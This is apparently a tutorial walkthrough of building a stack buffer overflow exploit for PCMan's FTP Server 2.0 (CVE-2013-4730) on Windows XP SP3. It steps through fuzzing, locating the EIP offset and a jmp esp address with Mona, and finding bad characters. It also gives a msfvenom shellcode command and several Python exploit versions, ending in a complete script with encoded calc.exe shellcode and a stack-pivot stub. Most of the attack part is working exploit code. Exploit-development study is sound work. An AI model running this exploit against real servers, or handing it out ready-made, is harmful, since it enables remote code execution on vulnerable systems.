# PCMan's FTP Server 2.0 - Win XP SP3 - Buffer Overflow

-   cve details: CVE-2013-4730
-   Target: PCMan's FTP Server 2.0
-   Platform : windows xp- SP3 - Build 2600
-   Exploit : Python 2.7
-   debugger: Immunity Debugger

I run target and check it. it's a program for use FTP.I open a .py file and in first time,I need a socket for connection with this program.

```
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",21))

exploit="A"*100

s.send(exploit)
print s.recv(1024)
s.close()
```

After run exploit.py ,program get my buffer:

![](/1.jpg)]


When Buffer increase to 3000, program crash and EIP chang to 41414141 :

![](/2.jpg)]


Now I run Immunity and use Mona for detecte exactly location of overflow . For this I run !mona pc 3000:

![](/3.jpg)]

After create pattern ,I copy Ascii section in my exploit (instead of "A"*3000) and run target in Immunity and run exploit.py . Target crash and I copy EIP to !mona po EIP:


![](/4.jpg)]

Buffer is 2011 and I need check it for this my exploit is: 

```
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",21))

exploit="A"*2011 + "BBBB" + "C"*100

s.send(exploit)
print s.recv(1024)
s.close()
```

everything is OK. EIP=42424242 and after it we have in Stack. 

![](/5.jpg)]

Now I need add shellcode and find address for "jmp esp" to point stack. My shellcode is run calc and its OK and for address I use MONA:

![](/6.jpg)]

after find jump to stack, Now I complet my exploit:

```
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",21))

exploit="A"*2011 + "\xd9\x2f\xe3\x74" + "\x90"*8+("\x31\xc9\xda\xd4\xb1\x33\xbd\xec\x71\x94\xde\xd9\x74\x24\xf4"
"\x5f\x31\x6f\x15\x03\x6f\x15\x83\x2b\x75\x76\x2b\x4f\x9e\xff"
"\xd4\xaf\x5f\x60\x5c\x4a\x6e\xb2\x3a\x1f\xc3\x02\x48\x4d\xe8"
"\xe9\x1c\x65\x7b\x9f\x88\x8a\xcc\x2a\xef\xa5\xcd\x9a\x2f\x69"
"\x0d\xbc\xd3\x73\x42\x1e\xed\xbc\x97\x5f\x2a\xa0\x58\x0d\xe3"
"\xaf\xcb\xa2\x80\xed\xd7\xc3\x46\x7a\x67\xbc\xe3\xbc\x1c\x76"
"\xed\xec\x8d\x0d\xa5\x14\xa5\x4a\x16\x25\x6a\x89\x6a\x6c\x07"
"\x7a\x18\x6f\xc1\xb2\xe1\x5e\x2d\x18\xdc\x6f\xa0\x60\x18\x57"
"\x5b\x17\x52\xa4\xe6\x20\xa1\xd7\x3c\xa4\x34\x7f\xb6\x1e\x9d"
"\x7e\x1b\xf8\x56\x8c\xd0\x8e\x31\x90\xe7\x43\x4a\xac\x6c\x62"
"\x9d\x25\x36\x41\x39\x6e\xec\xe8\x18\xca\x43\x14\x7a\xb2\x3c"
"\xb0\xf0\x50\x28\xc2\x5a\x3e\xaf\x46\xe1\x07\xaf\x58\xea\x27"
"\xd8\x69\x61\xa8\x9f\x75\xa0\x8d\x40\x94\x61\xfb\xe8\x01\xe0"
"\x46\x75\xb2\xde\x84\x80\x31\xeb\x74\x77\x29\x9e\x71\x33\xed"
"\x72\x0b\x2c\x98\x74\xb8\x4d\x89\x16\x5f\xde\x51\xf7\xfa\x66"
"\xf3\x07")


s.send(exploit)
print s.recv(1024)
s.close()
```

After run exploit on the target , Program only crash and it not run calc. I check it and I find problem.In my shellcode , there are some bad characters.
Badcharacters are some charactesr ,because broken shellcode. This characters is defferent for evry program. For example,in the bruteforce program,our input
like this: user:pass , program read input and split user and password with ":". Now if we exploit this program and in our shellcode have ":",shellcode broken
and don't run. For solve this problem we nhave to steps: 1- detect Badcharacters 2- remove it.
For first step I use Mona and second step use msfvenum.

For detect Badcharacters have 2 method: 1- manually 2- Automatically. In manually ,We create all 256 characters and add to exploit and Run it and check in stack.
And in Automatically method , using tools like Mona. I use Mona for this stage. For detect Badcharacters with Mona,we are several steps:
1- Create a folder like Mona and run this Command: !mona config -set workingfolder c:\mona\%p   (this step optionally. %p use for create automatically folder by project name)
2- Create all 256 Byte: !mona bytearray (its create in workingfolder c:/mona/projectname)
3- compare bytearray file with program buffer : !mona compare -f C:\mona\PCManFTPD2\bytearray.bin -a stack_address
4- Mona check badcharacters and show.
5- remove badcharacters from bytearray and create new witout it: !mona bytearray -cpb 'Badchar'
6- go to steps 3



![](/7.jpg)

![](/8.jpg)

now I need change my exploit. first copy it to c:/mona and change it to :

```
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",21))


badchar=open('PCManFTPD2/bytearray.bin','rb').read()
exploit= "USER: "+"A"*2005 + "\xd9\x2f\xe3\x74" + "\x90"*8 + badchar


s.send(exploit)
print s.recv(1024)
s.close()


```

Now run target in Immunity and run exploit.py. after crash , I use compare command. for this command I need address (stack address)


![](/9.jpg)


Now I run compare command ,and Mona detect badchar : 

![](/10.jpg)


00 is badcharacters. Now I create new Bytearray without this char:

![](/11.jpg)


I repeat this steps and for some case Mona don't work correctlly. For this reason, I use manully method. I run exploit and check characters without
Mona. If char is valid in buffer is ok but if char change to 0000 or corrupt buffer it's badchar. I find \x00\x0a\x0d\xff.

Now we need a shellcode without this characters. I use msfvenum.

```
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe  -f c -b '\x00\x0a\x0d\xff'
```

![](/12.jpg)

Now all thing is OK. I change exploit to :

```
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",21))

exploit="A"*2011 + "\xd9\x2f\xe3\x74" + "\x90"*8+(\xbb\xb2\x24\x22\xfb\xdb\xd2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x31\x31\x5a\x13\x83\xc2\x04\x03\x5a\xbd\xc6\xd7\x07\x29\x84"
"\x18\xf8\xa9\xe9\x91\x1d\x98\x29\xc5\x56\x8a\x99\x8d\x3b\x26"
"\x51\xc3\xaf\xbd\x17\xcc\xc0\x76\x9d\x2a\xee\x87\x8e\x0f\x71"
"\x0b\xcd\x43\x51\x32\x1e\x96\x90\x73\x43\x5b\xc0\x2c\x0f\xce"
"\xf5\x59\x45\xd3\x7e\x11\x4b\x53\x62\xe1\x6a\x72\x35\x7a\x35"
"\x54\xb7\xaf\x4d\xdd\xaf\xac\x68\x97\x44\x06\x06\x26\x8d\x57"
"\xe7\x85\xf0\x58\x1a\xd7\x35\x5e\xc5\xa2\x4f\x9d\x78\xb5\x8b"
"\xdc\xa6\x30\x08\x46\x2c\xe2\xf4\x77\xe1\x75\x7e\x7b\x4e\xf1"
"\xd8\x9f\x51\xd6\x52\x9b\xda\xd9\xb4\x2a\x98\xfd\x10\x77\x7a"
"\x9f\x01\xdd\x2d\xa0\x52\xbe\x92\x04\x18\x52\xc6\x34\x43\x38"
"\x19\xca\xf9\x0e\x19\xd4\x01\x3e\x72\xe5\x8a\xd1\x05\xfa\x58"
"\x96\xfa\xb0\xc1\xbe\x92\x1c\x90\x83\xfe\x9e\x4e\xc7\x06\x1d"
"\x7b\xb7\xfc\x3d\x0e\xb2\xb9\xf9\xe2\xce\xd2\x6f\x05\x7d\xd2"
"\xa5\x66\xe0\x40\x25\x47\x87\xe0\xcc\x97")


s.send(exploit)
print s.recv(1024)
s.close()
```

After run exploit.py, It don't run calc.exe. I check it and understand my buffer is small for shellcode and shellcode is broken.
for solve this problem I change junk and shellcode and after EIP I use some command to go my shellcode.

junk + EIP + NOP + Shellcode -> NOP + shellcode + EIP + NOP + jumptoshellcode

For this only need jumptoshellcode and implement it I use this command "sub    esp,0x5e " and "jmp    esp". But here is I have two steps:
1- change this Assambly to opcode(x86) -> use Immunity and add this to a line or use this [site](https://defuse.ca/online-x86-assembler.htm)
2- How many ,I need to recive my shellcode. -> I use manually and check it.

In the final,My exploit is :

```
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",21))


shellcode=("\xbf\x9f\x6d\xb4\x7d\xda\xcb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x31\x31\x7a\x13\x03\x7a\x13\x83\xea\x63\x8f\x41\x81\x73\xd2"
"\xaa\x7a\x83\xb3\x23\x9f\xb2\xf3\x50\xeb\xe4\xc3\x13\xb9\x08"
"\xaf\x76\x2a\x9b\xdd\x5e\x5d\x2c\x6b\xb9\x50\xad\xc0\xf9\xf3"
"\x2d\x1b\x2e\xd4\x0c\xd4\x23\x15\x49\x09\xc9\x47\x02\x45\x7c"
"\x78\x27\x13\xbd\xf3\x7b\xb5\xc5\xe0\xcb\xb4\xe4\xb6\x40\xef"
"\x26\x38\x85\x9b\x6e\x22\xca\xa6\x39\xd9\x38\x5c\xb8\x0b\x71"
"\x9d\x17\x72\xbe\x6c\x69\xb2\x78\x8f\x1c\xca\x7b\x32\x27\x09"
"\x06\xe8\xa2\x8a\xa0\x7b\x14\x77\x51\xaf\xc3\xfc\x5d\x04\x87"
"\x5b\x41\x9b\x44\xd0\x7d\x10\x6b\x37\xf4\x62\x48\x93\x5d\x30"
"\xf1\x82\x3b\x97\x0e\xd4\xe4\x48\xab\x9e\x08\x9c\xc6\xfc\x46"
"\x63\x54\x7b\x24\x63\x66\x84\x18\x0c\x57\x0f\xf7\x4b\x68\xda"
"\xbc\xa4\x22\x47\x94\x2c\xeb\x1d\xa5\x30\x0c\xc8\xe9\x4c\x8f"
"\xf9\x91\xaa\x8f\x8b\x94\xf7\x17\x67\xe4\x68\xf2\x87\x5b\x88"
"\xd7\xeb\x3a\x1a\xbb\xc5\xd9\x9a\x5e\x1a")

numberof=2011-len(shellcode)
jumptoshellcode="\x83\xec\x5e\x83\xec\x5e\x83\xec\x5e\x83\xec\x5e\xff\xe4\x90\x90"
exploit= numberof * '\x90' + shellcode + "\xd9\x2f\xe3\x74" + "\x90"*8 + jumptoshellcode



s.send(exploit)
print s.recv(1024)
s.close()

```
![](/13.jpg)
